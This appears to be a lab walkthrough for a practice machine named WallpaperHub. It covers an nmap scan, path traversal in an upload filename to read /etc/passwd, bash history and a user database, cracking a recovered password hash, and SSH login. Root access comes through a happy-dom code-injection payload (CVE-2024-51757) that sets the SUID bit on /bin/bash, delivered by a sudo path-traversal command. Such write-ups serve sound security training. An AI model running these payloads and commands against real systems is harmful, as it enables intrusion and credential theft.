---
icon: ubuntu
---

# WallpaperHub - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.204 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 16:29 EDT
Nmap scan report for 192.168.231.204
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: Wallpaper Hub - Home
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.90 ms 192.168.45.1
2   29.84 ms 192.168.45.254
3   29.93 ms 192.168.251.1
4   30.70 ms 192.168.231.204
```

### <mark style="color:$primary;">HTTP Port 5000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

Let's register an account and see what's inside. Default creds do not work

<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Path Traversal in Upload Feature</mark>

The **Upload Wallpaper** feature fails to sanitize filenames, allowing path traversal. Uploading a file named `../../../../../../../etc/passwd` lets a download retrieve `/etc/passwd`.&#x20;

Intercept the upload request Burpsuite, modify the filename field, then forward

<figure><img src="../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

Now when we download the file we see it's the /etc/passwd file

<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

...

<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

wp\_hub is the user I am going to target let's check his bash history.&#x20;

```swift
../../../../../../home/wp_hub/.bash_history
```

<figure><img src="../../.gitbook/assets/image (3070).png" alt=""><figcaption></figcaption></figure>

Now download the file again the same way and let's check it out

<figure><img src="../../.gitbook/assets/image (3071).png" alt=""><figcaption></figcaption></figure>

The bash history has only one database file! I am going to try and download the wallpaper\_hub database

```
../../../../../../home/wp_hub/wallpaper_hub/database.db
```

<figure><img src="../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

This is a SQLite 3 database. I am going to open it with SQLiteBrowser

The users table reveals wp\_hub's hash

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

I am going to try and crack it

<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

```
wp_hub:qazwsxedc
```

```
ssh wp_hub@192.168.231.204
```

<figure><img src="../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

we got a shell as wp\_hub

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>

This command, `/usr/bin/web-scraper`, is a symlink to `/opt/scraper/scraper.js`, a web scraping tool that imports the vulnerable `happy-dom` package.&#x20;

Happy-dom is susceptible to arbitrary code injection \[CVE-2024-51757]

To exploit this, we must create a malicious HTML payload.&#x20;

```
echo "chmod +s /bin/bash" > /tmp/deimos
chmod +x /tmp/deimos
```

<figure><img src="../../.gitbook/assets/image (2490).png" alt=""><figcaption></figcaption></figure>

This script sets the SUID bit on `/bin/bash`

Now I am going to create an HTML file that will trigger this script.&#x20;

Named it deimos.html and placed it into /tmp folder

```
<script src="http://192.168.45.158/'+require('child_process').execSync('/tmp/deimos')+'"></script>
```

<figure><img src="../../.gitbook/assets/image (2491).png" alt=""><figcaption></figcaption></figure>

I am going to start a simple python listener on my machine

```
python3 -m http.server 80
```

Now to leverage the path traversal in the web scraper.&#x20;

Run the following command as `wp_hub` to supply the malicious HTML payload to the tool:

```
sudo -u root /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/deimos.html
```

<figure><img src="../../.gitbook/assets/image (2492).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2494).png" alt=""><figcaption></figcaption></figure>

Now to escalate my privileges to root

<figure><img src="../../.gitbook/assets/image (2493).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Note make sure both scripts are locate in the /tmp folder**</mark>
